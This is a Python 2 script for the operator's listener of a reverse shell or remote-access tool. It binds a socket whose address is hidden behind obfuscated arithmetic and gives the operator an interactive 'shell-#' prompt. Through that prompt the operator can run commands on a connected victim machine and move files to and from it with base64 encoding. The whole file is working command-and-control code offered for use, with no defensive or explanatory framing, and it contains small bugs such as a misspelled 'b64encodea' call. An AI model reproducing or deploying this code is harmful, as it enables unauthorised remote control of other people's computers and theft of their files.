#!/usr/bin/python

import socket
import json
import base64
import os

Host = "192.168.0.5"
Port = 5050

def server():
    global s
    global conn
    global addr
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((H_ost(), P_ort()))
    s.listen(5)
    os.system("clear")
    print('[*] listening Time for incoming connections......')
    conn, addr = s.accept()
    print('[*] connection established from: %s' % str(addr))
    shell()

def H_ost():
    H = str((5*(10+10))+(2*(20+20))+(3*4))+'.'
    o = str((5*((2*5)+(2*5)))+(2*(3*10))+(2*4))+'.'
    s = str((5*(((2*4)+2)+((2*3)+(2*2))))+((2*5)*5)+(3*3))+'.'
    t = str((5*((((1+1)*2)+((2+1)*2))+((2**3)+2)))+(((1+1)*10)+(2*4)))
    Host = H+o+s+t
    return Host

def P_ort():
    port = ""
    for i in range(5, 0, -1):
        port = str(port) + str(i)
    return int(port)



def shell():
    global counter
    while True:
        command = raw_input('\n shell-# %s:- ' %str(addr))
        reliable_send(command)
        if command == 'exit' : exit()
        elif command[:2] == "cd" and len(command) > 1: continue
        elif command[:8] in ["Download", "download"]:
            with open(command[9:], "wb") as file:
                file_data = reliable_recv()
                file.write(base64.b64decode(file_data))
        elif command[:6] in ["upload", "Upload"]:
            try:
                with open(command[7:], "rb") as fin:
                    reliable_send(base64.b64encode(fin.read()))
            except:
                filed = "Fild To Upload"
                reliable_send(base64.b64encodea(filed))
        else:
            result = reliable_recv()
            print(result)

def reliable_send(data):
    json_data= json.dumps(data)
    conn.send(json_data)

def reliable_recv():
    data=''
    while True:
        try:
            data = data + conn.recv(1024)
            return json.loads(data)
        except ValueError:
            continue

    

server()